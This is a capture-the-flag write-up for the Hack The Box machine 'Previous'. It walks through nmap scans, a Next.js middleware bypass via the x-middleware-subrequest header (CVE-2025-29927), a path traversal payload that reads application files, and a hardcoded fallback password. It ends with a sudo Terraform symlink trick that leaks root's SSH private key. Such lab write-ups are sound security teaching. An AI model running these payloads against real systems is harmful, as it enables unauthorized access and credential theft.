# Previous

## 1. Introduction

### 1.1 Background

**Previous** is a <i>Medium</i> Linux machine from Hack The Box that combines modern vulnerabilities in **Next.js** applications, authentication bypass using a recent CVE, arbitrary file read, and a privilege escalation based on a misconfiguration of **Terraform**.

### 1.2 Objectives

## 2. Enumeration

### 2.1 Initial Reconnaissance

We begin by verifying connectivity:

```bash
❯ ping -c1 ready.htb
```

The host responds correctly, confirming it is active.

### 2.2 Nmap

We perform a full port scan:

```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 10.129.227.132 -oN allports --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-22 09:20 CST
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 09:20 (0:00:00 remaining)
Nmap scan report for 10.129.227.132
Host is up (0.32s latency).
Not shown: 33428 closed tcp ports (reset), 32105 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen
```

Detected open ports:

Proceed with a more detailed scan:

```bash
❯ nmap -p22,5080 -sCV -Pn -oN targeted 10.129.227.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-22 09:24 CST
Nmap scan report for 10.129.227.132
Host is up (0.084s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.227.132:5080/users/sign_in
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Relevant results:

### 2.3 Web Application Analysis

Using Wappalyzer, it is identified that the application is built with:

<img width="1012" height="581" alt="image" src="https://github.com/user-attachments/assets/45092361-92dd-46b6-b7d6-1c56fc0c302e" />

- **Next.js 15.2.2**

Researching this version reveals information about:

#### CVE-2025-29927

This vulnerability allows an **authorization bypass in middleware** by manipulating the header:

```
x-middleware-subrequest
```

## 3. Exploitation 

### 3.1 Authentication Bypass

We intercept authentication with **Burp Suite** and, instead of modifying each request manually, configure a rule in **Proxy → Match and Replace** so that Burp automatically adds the header:

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

With the header applied to all requests, the middleware is bypassed and we obtain unauthorized access to:

```
/docs
```

Then we access:

```
http://previous.htb/docs/examples
```

A downloadable example is shown:

<img width="1227" height="274" alt="image" src="https://github.com/user-attachments/assets/5a7c7171-172d-4053-bc3e-6783b45dde1a" />

Downloadable from:

```
/api/download?example=hello-world.ts
```

### 3.2 Local File Read (Path Traversal)

We intercept the request:

```
GET /api/download?example=hello-world.ts
```

We modify the `example` parameter to attempt a Path Traversal:

```
/api/download?example=./../../../proc/self/cwd/package.json
```

The response successfully returns the `package.json` file, confirming an **arbitrary file read vulnerability**.

Relevant content:

```json
"dependencies": {  
"next": "^15.2.2",  
"next-auth": "^4.24.11"  
}
```

### 3.2 Internal Project Enumeration

Taking advantage of the arbitrary file read, we access:

```
../../../../proc/self/cwd/.next/routes-manifest.json
```

We discover the endpoint:

```
/api/auth/[...nextauth]
```

Then we access the compiled file:

```
../../../../proc/self/cwd/.next/server/pages/api/auth/[...nextauth].js
```

Reviewing the transpiled source code, we find the authentication logic:

```javascript
e?.username === "jeremy" &&  
e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
```

This reveals that the valid user is **jeremy**, and if the environment variable `ADMIN_SECRET` is not defined, the system uses the default password:

```
MyNameIsJeremyAndILovePancakes
```

Since the value is hardcoded as a fallback, we were able to use these credentials directly to authenticate and obtain initial access to the system via SSH.

## 4. Privilege Escalation

We check sudo permissions:

```bash
❯ sudo -l
```

Relevant output:

```
User jeremy may run the following commands:  
(root) /usr/bin/terraform -chdir=/opt/examples apply
```

We also observe the file:

```
.terraformrc
```

Content:

```
provider_installation {  
  dev_overrides {  
    "previous.htb/terraform/examples" = "/usr/local/go/bin"  
  }  
  direct {}  
}
```

This suggests that Terraform can load resources from controllable paths.

### 4.1 Exploitation via Symlink

We create the following structure:

```bash
❯ mkdir -p /tmp/root/examples  
❯ cd /tmp/root/examples  
❯ ln -s /root/.ssh/id_rsa pwn
```

Then we execute:

```bash
❯ TF_VAR_source_path=/tmp/root/examples/pwn sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform processes the resource and ends up displaying the content of the symbolically linked file:

```
/root/.ssh/id_rsa
```

### 4.2 Root Access

We save the key:

```bash
❯ chmod 600 id_rsa
```

We connect:

```bash
❯ ssh -i id_rsa root@previous.htb
```

Verification:

```bash
❯ whoami
root
```
